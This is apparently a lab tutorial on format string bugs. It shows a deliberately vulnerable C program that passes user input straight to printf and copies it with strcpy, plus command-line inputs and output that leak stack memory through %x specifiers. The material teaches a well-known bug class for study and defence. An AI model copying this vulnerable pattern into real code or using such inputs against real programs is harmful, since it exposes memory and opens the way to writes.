# Format Strings – Stack Leak

## Vulnerability
The program uses `printf(text)` where `text` is fully user-controlled.  
This allows an attacker to supply format specifiers such as `%x`, `%s`, or `%n`, leading to **stack memory disclosure** and potentially arbitrary memory writes.

---

### fmt_vuln.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;

   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);

   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");

   // Debug output
   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

   exit(0);
}
```

## Stack Leak Using %x

```bash
./fmt_vuln "testing %x"
```
```bash
The right way to print user-controlled input:
testing %x
The wrong way to print user-controlled input:
testing bffff3e0
[*] test_val @ 0x08049794 = -72 0xffffffb8
```

## Dumping Stack Memory

```bash
./fmt_vuln "$(perl -e 'print "%08x."x40')"

```
```bash
The wrong way to print user-controlled input:
bffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.
78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
[*] test_val @ 0x08049794 = -72 0xffffffb8
```

Each %08x prints one 4-byte word from the stack.
The repeating values indicate that the format string itself is being read from memory.